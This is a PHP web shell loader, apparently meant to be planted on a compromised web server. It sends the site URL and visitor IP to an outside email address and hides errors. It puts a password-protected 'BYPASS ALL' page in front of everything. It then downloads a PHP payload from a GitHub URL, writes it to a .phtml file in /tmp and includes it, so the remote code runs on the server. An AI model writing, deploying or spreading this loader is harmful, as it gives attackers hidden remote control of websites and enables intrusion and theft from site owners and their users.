<?php 
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$to = 'gmakarim7@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Result Logger Mu | 0x4u", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
set_time_limit(0);
error_reporting(0);
$auth_pass ="f3e5acc1a1f18e4a6a3dc9b211a714a4";
if(get_magic_quotes_gpc()) {   
function VEstripslashes($array) {     
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
  die("<!DOCTYPE html>
  <html>
      <head>
          <title>Bypass All𝐥</title>=
          <link rel='preconnect' href='https://fonts.googleapis.com'>
          <link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
          <link href='https://fonts.googleapis.com/css2?family=Caveat:wght@700&display=swap' rel='stylesheet'>
          <link rel='icon' href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABzElEQVRYhb2XL0gEURDGfx6HiIhcEBGTwSQGETGICIKIGI5D0WC8YhODSUSDGMzmS6bLYrIIIgaTYPppb5fYx82cdNwT3LANTdP33FCzFAwd5/Hm+z5mdnfmgYPJ84QLhlMwMAiMuQAkHQXMAing0BEnvvnpvxDcupbBKqBfIN9HrTYPppb5fYx82cdNwT3LANTdP33FCzFAwd5gWVXPhOw1rgyC05AMXKlB5D2CYogACQbi4llKkKkSNxsXLClIA+NlgsqfwfVkFbysoMNflwL7pQrPEwQJwZqgUCGt9fCiYFvQ/C1RMCK4bgD5nWAiNH+ClCBfR/J9QWeVEn43mazgpYbE74JlxXnpBX2C8xqQX8mbG+KboFWQcyDPC9pN5GVClgzk64qAHbUmjwbdz02GoFAT7BkycFQr8jbBm0FAUdD1H36UEkwDLQbtCby+4SygUp//ADaAReC1wpnYzemX+Z/hU0h6LwVDgXN9+j2ifXlBP83JJCATApoTtIWcbRHs6O+skHURsBsAehDMR4hJC+4DcftW8mafVIJjQU+M2G7BgR/7ZvobCqb8Gm7KcIWTYPppb5fYx82cdNwT3LANTdP33FCzFAwd5icFciMkyHL2GAAAAABJRU5ErkJggg==' sizes='32x32' />
      </head>
  <style>
      html{
          background-color: black;
      }
      .mind,font{
          text-align: center;
          color: #00ceff;
      }
      input{
          background-color: transparent;
          border-color: black;
          border: 2px solid #00ceff;
          border-radius: 50px 20px;
          text-align: center;
          color: #00ceff;
      }
  </style>
  <body><br><br>
      <h1 class='mind'>BYPASSSSSS ALL</h1>
      <center><br>
          <form method='post'><input style='text-align:center;' type='password' name='pass'></form>
          <br><br><br><font>&copy; 2023 forbidden</font>
      </center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?php
$data = ['https://raw.githubusercontent.com/lyyahm/web/refs/heads/main/a.php', '/tmp/sesss_'.md5($_SERVER['HTTP_HOST']).'.phtml'];
 
if(file_exists($data[1]) && filesize($data[1]) !== 0) {
    include($data[1]);
} else {
    $fopen = fopen($data[1], 'w+');
    fwrite($fopen, get($data[0]));
    fclose($fopen);
    echo '<script>window.location="?zet";</script>';
}
 
function get($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec($ch);
          curl_close($ch);
}
?>